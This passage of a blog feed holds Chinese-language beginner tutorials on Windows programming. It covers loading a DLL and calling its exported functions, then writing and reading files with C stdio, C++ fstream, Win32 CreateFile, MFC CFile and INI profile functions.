src="/2022/07/25/dynamiclink/008.png" class=""><p>效果也ok的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FAVE_1)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(_stdcall *FAVE)</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//加载dll</span></span><br><span class="line">HMODULE hMod = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;myDll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hMod)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;模块加载成功!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">FAVE_1 func = (FAVE_1)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave_1&quot;</span>);</span><br><span class="line">FAVE func1 = (FAVE)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (func)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;函数加载成功!\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">func</span>(<span class="number">200</span>, <span class="number">300</span>) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">func1</span>(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">FreeLibrary</span>(hMod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>关于动态库，其实还有挺多可以优化的地方，但现在了解为主吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows文件处理</title>
      <link href="/2022/07/23/windowsFiles/"/>
      <url>/2022/07/23/windowsFiles/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>windows常见的文件操作有日志、操作配置文件、ini、注册表、音视频的文件存储。<br>而linux系统具有一切皆文件的概念。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>c&#x2F;c++那会都是打开一个文件然后以什么模式，用完还要关闭。</p><hr><h2 id="c-x2F-c-win32-mfc文件操作"><a href="#c-x2F-c-win32-mfc文件操作" class="headerlink" title="c&#x2F;c++ win32 mfc文件操作"></a>c&#x2F;c++ win32 mfc文件操作</h2><h3 id="c文件操作"><a href="#c文件操作" class="headerlink" title="c文件操作"></a>c文件操作</h3><p><code>fopen</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_ACRTIMP FILE* __cdecl <span class="title">fopen</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_ <span class="type">char</span> <span class="type">const</span>* _FileName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_ <span class="type">char</span> <span class="type">const</span>* _Mode</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p><code>fopen_s</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_ACRTIMP <span class="type">errno_t</span> __cdecl <span class="title">fopen_s</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Outptr_result_nullonfailure_ FILE**      _Stream,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_                        <span class="type">char</span> <span class="type">const</span>* _FileName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_                        <span class="type">char</span> <span class="type">const</span>* _Mode</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p><code>fwrite</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_ACRTIMP <span class="type">size_t</span> __cdecl <span class="title">fwrite</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(_ElementSize * _ElementCount) <span class="type">void</span> <span class="type">const</span>* _Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_                                           <span class="type">size_t</span>      _ElementSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_                                           <span class="type">size_t</span>      _ElementCount,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_                                        FILE*       _Stream</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>带s一般都是所谓的安全函数</p><p>几种模式<code>_Mode</code></p><img src="/2022/07/23/windowsFiles/000.png" class=""><ol><li>a add</li><li>r read</li><li>w weite</li><li><ul><li>要求文件存在，权限估计也比较高</li></ul></li></ol><p>然后随便写个按钮绑定一下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//C 写文件</span></span><br><span class="line">FILE *pFile = <span class="built_in">fopen</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);<span class="comment">//以写入模式打开文件</span></span><br><span class="line"><span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;文件打开失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;c language file&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fwrite</span>(szBuf, <span class="number">1</span>, <span class="built_in">strlen</span>(szBuf)+<span class="number">1</span>, pFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">//用完关闭</span></span><br><span class="line"><span class="built_in">fclose</span>(pFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/001.png" class=""><p>点击按钮之后文件夹目录就会多了这个1.txt，内容也是我们写的szBuf。<br>具体可以看文件创建时间是否符合我们刚才按下按钮的时候。</p><p>然后使用读文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//c 读文件</span></span><br><span class="line">FILE *pFile = <span class="built_in">fopen</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;文件打开失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szbuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">fread</span>(szbuf, <span class="number">1</span>, <span class="number">1024</span>, pFile);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(pFile);</span><br><span class="line"><span class="built_in">MessageBox</span>(szbuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/002.png" class=""><p>实现起来也比较简单。</p><p>不过这里有个点要注意，因为读文件的时候文件不一定就写满了1024.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//c 读文件</span></span><br><span class="line">FILE *pFile = <span class="built_in">fopen</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;文件打开失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szbuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//fseek 求文件的偏移量</span></span><br><span class="line"><span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">int</span> fLen = <span class="built_in">ftell</span>(pFile);<span class="comment">//等到文件指针的当前位置</span></span><br><span class="line"><span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_SET);<span class="comment">//前面的end会使指针跑到最后后面导致读数据都是空的</span></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">fread</span>(szbuf, <span class="number">1</span>, fLen, pFile);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(pFile);</span><br><span class="line"><span class="built_in">MessageBox</span>(szbuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要注意偏移之后要让指针回到起始位置。</p><hr><h3 id="c-文件操作"><a href="#c-文件操作" class="headerlink" title="c++文件操作"></a>c++文件操作</h3><p>c++是以类作为核心的语言，所以文件也通过一个类读写。<code>std::ofstream</code></p><p>使用前记得</p><blockquote><p>#include <fstream><br>using namespace std;</p></blockquote><p>不然没法用这个类。解锁命名空间也是为了写着方便</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//c++ 写</span></span><br><span class="line"><span class="function">ofstream <span class="title">ofs</span><span class="params">(<span class="string">&quot;2.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;c++ file edit&quot;</span>;</span><br><span class="line">ofs.<span class="built_in">write</span>(szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>);</span><br><span class="line">ofs.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写起来也非常简单</p><p>顺便把读文件也写了，到时候再看。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="comment">//c++ 读</span></span><br><span class="line"><span class="function">ifstream <span class="title">ifs</span><span class="params">(<span class="string">&quot;2.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ifs.<span class="built_in">read</span>(szBuf, <span class="number">1024</span>);</span><br><span class="line">ifs.<span class="built_in">close</span>();</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/003.png" class=""><p>效果自然是没啥问题的。</p><hr><h3 id="win32-api"><a href="#win32-api" class="headerlink" title="win32 api"></a>win32 api</h3><p>其实跟之前进程用到过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateFileW</span>(</span><br><span class="line">    _In_ LPCWSTR lpFileName,    <span class="comment">//创建或打开的对象名称</span></span><br><span class="line">    _In_ DWORD dwDesiredAccess, <span class="comment">//访问方式 读 写 查</span></span><br><span class="line">    _In_ DWORD dwShareMode,     <span class="comment">//共享方式 0</span></span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,    <span class="comment">//NULL 不能被进程继承</span></span><br><span class="line">    _In_ DWORD dwCreationDisposition,   <span class="comment">//如何创建文件NEW ALWAYS</span></span><br><span class="line">    _In_ DWORD dwFlagsAndAttributes,    <span class="comment">//设置文件属性</span></span><br><span class="line">    _In_opt_ HANDLE hTemplateFile       <span class="comment">//NULL</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>至于a和w就是多字节和Unicode的区别。</p><p>写文件的方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WriteFile</span>(</span><br><span class="line">    _In_ HANDLE hFile,</span><br><span class="line">    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,</span><br><span class="line">    _In_ DWORD nNumberOfBytesToWrite,</span><br><span class="line">    _Out_opt_ LPDWORD lpNumberOfBytesWritten,</span><br><span class="line">    _Inout_opt_ LPOVERLAPPED lpOverlapped</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>随便写写。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//win32 write</span></span><br><span class="line">HANDLE hFile;</span><br><span class="line">hFile = <span class="built_in">CreateFile</span>(<span class="string">&quot;3.txt&quot;</span>, GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, </span><br><span class="line">CREATE_NEW, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;创建文件对象失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;win32 api edit file&quot;</span>;</span><br><span class="line"><span class="built_in">WriteFile</span>(hFile, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//win32 read</span></span><br><span class="line">HANDLE hFile;</span><br><span class="line">hFile = <span class="built_in">CreateFile</span>(<span class="string">&quot;3.txt&quot;</span>, GENERIC_READ, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;创建文件对象失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, szBuf, <span class="number">1024</span>, &amp;dwRead, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/004.png" class=""><p>这里有点比较麻烦，就是write的时候，好像只能创建一次<br><code>hFile = CreateFile(&quot;3.txt&quot;, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);</code></p><p>其中<code>CREATE_NEW</code>就是新建的意思，但是如果存在了他就会报错，但改成其它的感觉又不太合适。先凑合用。</p><hr><h3 id="MFC"><a href="#MFC" class="headerlink" title="MFC"></a>MFC</h3><p>写法跟c++比较类似吧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//mfc write</span></span><br><span class="line"><span class="function">CFile <span class="title">cf</span><span class="params">(<span class="string">&quot;4.txt&quot;</span>, CFile::modeCreate | CFile::modeWrite)</span></span>;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = <span class="string">&quot;mfc edit files&quot;</span>;</span><br><span class="line">cf.<span class="built_in">Write</span>(szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>);</span><br><span class="line">cf.<span class="built_in">Close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//mfc read</span></span><br><span class="line"><span class="function">CFile <span class="title">cf</span><span class="params">(<span class="string">&quot;4.txt&quot;</span>, CFile::modeRead)</span></span>;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">cf.<span class="built_in">Read</span>(szBuf, <span class="number">1024</span>);</span><br><span class="line">cf.<span class="built_in">Close</span>();</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/005.png" class=""><p>这样最基础的操作肯定是没问题的。</p><p>不过读文件好像还有别的骚操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//mfc read</span></span><br><span class="line"></span><br><span class="line"><span class="function">CFileDialog <span class="title">fileDlg</span><span class="params">(TRUE)</span></span>;</span><br><span class="line">fileDlg.m_ofn.lpstrTitle = <span class="string">&quot;Test&quot;</span>;</span><br><span class="line"><span class="comment">//过滤器</span></span><br><span class="line">fileDlg.m_ofn.lpstrFilter = <span class="string">&quot;Text Files(*.txt)\0*.txt\0All Files(*.*)\0*.*\0\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IDOK == fileDlg.<span class="built_in">DoModal</span>())&#123;</span><br><span class="line"><span class="function">CFile <span class="title">cf</span><span class="params">(fileDlg.GetFileName(), CFile::modeRead)</span></span>;</span><br><span class="line">DWORD dwFileLen = cf.<span class="built_in">GetLength</span>();</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">cf.<span class="built_in">Read</span>(szBuf, dwFileLen);</span><br><span class="line">cf.<span class="built_in">Close</span>();</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/23/windowsFiles/006.png" class=""><p>点击读文件他会弹出一个文件夹让你选。<br>然后根据我们的过滤器，一种是text一种是all</p><img src="/2022/07/23/windowsFiles/007.png" class=""><p>随便打开其中一个都能读出来</p><img src="/2022/07/23/windowsFiles/008.png" class=""><hr><h2 id="配置文件的操作"><a href="#配置文件的操作" class="headerlink" title="配置文件的操作"></a>配置文件的操作</h2><p>配置文件的格式比较特殊，<code>.ini</code><br>里面一般都是配置选项。<br><code>WritePrivateProfileString</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WritePrivateProfileStringW</span>(</span><br><span class="line">    _In_opt_ LPCWSTR lpAppName,</span><br><span class="line">    _In_opt_ LPCWSTR lpKeyName,</span><br><span class="line">    _In_opt_ LPCWSTR lpString,</span><br><span class="line">    _In_opt_ LPCWSTR lpFileName</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>w和a就是对这些字符的要求不一样。</p><p>然后瞎写一个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//ini write</span></span><br><span class="line"><span class="type">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetCurrentDirectory</span>(MAX_PATH, szPath);</span><br><span class="line">CString szPathFile;</span><br><span class="line">szPathFile.<span class="built_in">Format</span>(<span class="string">&quot;%s\\Test.ini&quot;</span>, szPath);</span><br><span class="line"><span class="comment">//瞎写的。</span></span><br><span class="line"><span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;man&quot;</span>, <span class="string">&quot;friend&quot;</span>, <span class="string">&quot;张三&quot;</span>, szPathFile);</span><br><span class="line"><span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;man&quot;</span>, <span class="string">&quot;student&quot;</span>, <span class="string">&quot;李四&quot;</span>, szPathFile);</span><br><span class="line"><span class="built_in">WritePrivateProfileString</span>(<span class="string">&quot;school&quot;</span>, <span class="string">&quot;teacher&quot;</span>, <span class="string">&quot;王五&quot;</span>, szPathFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动之后点击写文件</p><img src="/2022/07/23/windowsFiles/009.png" class=""><p>可以在文件夹目录下看到我们写的配置。</p><p>至于读文件，也有点相似吧<br>要用到这个玩意</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetPrivateProfileStringW</span>(</span><br><span class="line">    _In_opt_ LPCWSTR lpAppName,</span><br><span class="line">    _In_opt_ LPCWSTR lpKeyName,</span><br><span class="line">    _In_opt_ LPCWSTR lpDefault,</span><br><span class="line">    _Out_writes_to_opt_(nSize, <span class="keyword">return</span> + <span class="number">1</span>) LPWSTR lpReturnedString,</span><br><span class="line">    _In_     DWORD nSize,</span><br><span class="line">    _In_opt_ LPCWSTR lpFileName</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>额，这里ini格式瞎写的，所以读出来的时候可能看着太怪了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ini read</span></span><br><span class="line"><span class="type">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetCurrentDirectory</span>(MAX_PATH, szPath);</span><br><span class="line">CString szPathFile;</span><br><span class="line">szPathFile.<span class="built_in">Format</span>(<span class="string">&quot;%s\\Test.ini&quot;</span>, szPath);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> dwKey[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> dwKeyName[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> dwValue[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;man&quot;</span>, <span class="string">&quot;friend&quot;</span>, <span class="literal">NULL</span>, dwKey, <span class="number">1024</span>, szPathFile);</span><br><span class="line"><span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;man&quot;</span>, <span class="string">&quot;student&quot;</span>, <span class="literal">NULL</span>, dwKeyName, <span class="number">1024</span>, szPathFile);</span><br><span class="line"><span class="built_in">GetPrivateProfileString</span>(<span 